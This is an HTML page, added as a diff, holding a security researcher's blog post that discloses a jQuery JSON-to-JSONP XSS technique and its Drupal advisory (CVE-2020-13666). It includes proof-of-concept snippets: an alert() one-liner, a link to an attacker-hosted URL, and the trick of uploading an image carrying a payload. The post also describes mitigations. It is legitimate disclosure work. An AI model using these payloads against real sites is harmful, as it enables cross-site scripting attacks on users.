@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#">
+  <head>
+    <meta charset="utf-8" />
+<link rel="canonical" href="https://mortenson.coffee/blog/promoting-jquery-json-jsonp-trigger-xss" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:site_name" content="Samuel Mortenson" />
+<meta name="twitter:title" content="Promoting jQuery JSON to JSONP to trigger XSS" />
+<meta name="twitter:site" content="@mortensonsam" />
+<meta name="description" content="I’ve done quite a bit of security research for Drupal, and one area of exploitation that I often come back to is the AJAX API. Drupal’s AJAX API is built on top of jQuery, and lets developers easily add interactive behavior to the frontend." />
+<meta property="og:url" content="https://mortenson.coffee/blog/promoting-jquery-json-jsonp-trigger-xss" />
+<meta name="twitter:creator" content="@mortensonsam" />
+<meta property="og:title" content="Promoting jQuery JSON to JSONP to trigger XSS" />
+<meta name="twitter:url" content="https://mortenson.coffee/blog/promoting-jquery-json-jsonp-trigger-xss" />
+<meta property="og:description" content="I’ve done quite a bit of security research for Drupal, and one area of exploitation that I often come back to is the AJAX API. Drupal’s AJAX API is built on top of jQuery, and lets developers easily add interactive behavior to the frontend." />
+<meta property="article:tag" content="drupal" />
+<meta property="article:tag" content="security" />
+<meta property="article:published_time" content="2020-11-19T15:17:08+00:00" />
+<meta property="article:modified_time" content="2020-11-19T14:49:32+00:00" />
+<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="/themes/custom/mortenson/favicon.png" type="image/png" />
+<link rel="revision" href="https://mortenson.coffee/blog/promoting-jquery-json-jsonp-trigger-xss" />
+
+    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://mortenson.coffee/feed.xml" />
+    <title>Promoting jQuery JSON to JSONP to trigger XSS | Samuel Mortenson</title>
+    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_RuEjmPT5dJhxGZtbhmaKQMs0spdvgqcE0CXbmvdbK94.css" />
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_aB2y-NhDKnlxBV1Cet-J9ahL-zIUh26rTpZB5aGZKSk.css" />
+
+    
+  </head>
+  <body>
+    <a href="#main-content" class="visually-hidden focusable">
+      Skip to main content
+    </a>
+    
+      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
+      <header class="mc-header container ">
+          <a href="/blog" class="mc-header__back">Back to blog</a>
+              <a href="/" class="mc-header__name">
+            Samuel<br />Mortenson
+          </a>
+          </header><main id="main-content">
+    <div>
+    <div data-drupal-messages-fallback class="hidden"></div>  <article class="mc-blog container container--margin" role="article">
+        <div class="mc-blog-title container">
+    <div class="mc-blog-title__bg"></div>
+    <h1 class="mc-blog-title__title">Promoting jQuery JSON to JSONP to trigger XSS</h1>
+  </div>    <div class="mc-blog__byline">
+      Nov 19th, 2020
+    </div>
+    <div class="mc-blog__text">
+      
+            <div><p>I’ve done quite a bit of security research for Drupal, and one area of exploitation that I often come back to is the AJAX API. Drupal’s AJAX API is built on top of jQuery, and lets developers easily add interactive behavior to the frontend.</p>
+<p>One method of enabling this functionality is to add the “<span class="monospace">use-ajax</span>” class to clickable HTML elements. For example, in a previous blog post “<a href="https://mortenson.coffee/blog/getting-creative-drupal-xss">Getting creative with Drupal XSS</a>” I found that you could trigger XSS by pointing one of these elements to an external site:</p>
+<p><code class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"use-ajax"</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></p>
+<p>This has since been fixed to only allow local URLs, but I kept wondering - can this be exploitable?</p>
+<p><code class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://safedomain.com/&lt;payload&gt;"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"use-ajax"</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></p>
+<p>Or at a lower level, is this exploitable?</p>
+<p><code class=" hljs javascript">$.ajax(<span class="hljs-string">"&lt;payload&gt;”, {dataType: "</span>json<span class="hljs-string">"})</span></code></p>
+<p>The answer was, surprisingly, yes. You can trigger XSS by only controlling the AJAX URL, or in some cases just the tail end of the URL, regardless of the caller.</p>
+<p>To explain this, let’s read the documentation for jQuery.ajax():</p>
+<blockquote><p>dataType (default: Intelligent Guess (xml, json, script, or html))<br />
+Type: String<br />
+The type of data that you're expecting back from the server.<br />
+[...]<br />
+"json": Evaluates the response as JSON and returns a JavaScript object. <strong>Cross-domain "json" requests that have a callback placeholder, e.g. ?callback=?, are performed using JSONP unless the request includes jsonp: false</strong> in its request options. [...]</p>
+</blockquote>
+<p>This was an interesting find for me - to summarize, if you make an AJAX request with the dataType set to “<span class="monospace">json</span>”, but the URL includes “<span class="monospace">?callback=?</span>”, the response is treated like JSONP. For those that are unaware, JSONP responses are executed as JavaScript, which means that if you control part of a jQuery AJAX URL and the response, you can trigger XSS. This is true for all up to date versions of jQuery except 4.x which changed the behavior in <a href="https://github.com/jquery/jquery/issues/3376">https://github.com/jquery/jquery/issues/3376</a>.</p>
+<p>Here’s what an exploit might look like:</p>
+<p><code class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+    $.ajax(<span class="hljs-string">"/payload.json?callback=?"</span>, {
+        <span class="hljs-attr">dataType</span>: <span class="hljs-string">"json"</span>,
+    });
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></p>
+<p>Or as a portable one-liner:</p>
+<p><code class=" hljs php">jQuery.ajax(<span class="hljs-string">"data:;,alert('@mortensonsam')//?callback=?"</span>, {<span class="hljs-string">"dataType"</span>: <span class="hljs-string">"json"</span>})</code></p>
+<p>You may be thinking “When will I ever get to control the URL?”, but it happens! Think of any web application that fetches (normally safe) JSON from an external URL. There may be more uses for this than you assume.</p>
+<p>Let’s bring it back to Drupal - as I mentioned before, the magic in the “<span class="monospace">use-ajax</span>” class only applies to local URLs now, and for this exploit to work you need to control the response data. What kind of responses do lower privileged users control? Images! For this exploit, a path like “<span class="monospace">/payload.gif?callback=?</span>” will work just as well as “<span class="monospace">/payload.json?callback=?</span>”.</p>
+<p>I won’t give you the full tutorial for embedding JavaScript into images, but if I recall correctly I used this tool for the task <a href="https://github.com/jklmnn/imagejs">https://github.com/jklmnn/imagejs</a>.</p>
+<p>Once a user could upload a malicious image, they could then put in some HTML like this:</p>
+<p><code class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://safesite.com/sites/default/files/payload.gif?callback=?"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"use-ajax"</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></p>
+<p>To trigger XSS. It’s worth noting that the scope of this wasn’t all encompassing - every Drupal 6, 7, and 8 site needed updating, but not every configuration of those sites were affected. Drupal 8 in particular was hardened by default against this since it doesn’t allow arbitrary classes to be added to links.</p>
+<p>So - how do you mitigate something like this? Per the jQuery docs quoted above, adding “<span class="monospace">jsonp: false</span>” to your AJAX settings should do the trick. For example, this code should be safe:</p>
+<p><code class=" hljs javascript">$.ajax(<span class="hljs-string">"&lt;payload&gt;"</span>, {<span class="hljs-attr">dataType</span>: <span class="hljs-string">"json"</span>, <span class="hljs-attr">jsonp</span>: <span class="hljs-literal">false</span>})</code></p>
+<p>However, earlier versions of jQuery 1.x did not support the “jsonp” setting, so we had to filter every URL passed to $.ajax to strip anything that would trigger JSON to JSONP promotion (specifically anything matching the regex <span class="monospace">/\=\?(&amp;|$)/</span>). You can see the full fix for older jQuery versions here: <a href="https://git.drupalcode.org/project/drupal/-/blob/7.x/misc/drupal.js#L436-441">https://git.drupalcode.org/project/drupal/-/blob/7.x/misc/drupal.js#L436-441</a>.</p>
+<p>So, if you’re using jQuery and letting users provide AJAX URLs, make sure you’re up to date and passing the “<span class="monospace">jsonp: false</span>” setting through!</p>
+<p>Drupal released a fix in SA-CORE-2020-007 (CVE-2020-13666), which you can read about here: <a href="https://www.drupal.org/sa-core-2020-007">https://www.drupal.org/sa-core-2020-007</a>. Thanks to everyone who helped fix this bug!</p>
+</div>
+      
+    </div>
+  </article>
+
+  </div>
+
+</main>
+  <footer class="mc-footer container">
+    <ul class="mc-footer__menu">
+      <li><a href="/search">Search</a></li>
+      <li><a href="/blog">Blog</a></li>
+      <li><a href="/work">Work</a></li>
+      <li><a href="/gallery">Gallery</a></li>
+      <li><a href="mailto:samuel@mortenson.coffee">Contact</a></li>
+    </ul>
+    <div class="mc-footer__copyright">©2020 Samuel Mortenson</div>
+    <a class="mc-footer__rss" href="/feed.xml">
+      <span class="visually-hidden">RSS Feed</span>
+      <img alt="RSS feed icon" src="/core/misc/feed.svg" />
+    </a>
+  </footer>
+  </div>
+
+    
+    
+  </body>
+</html>
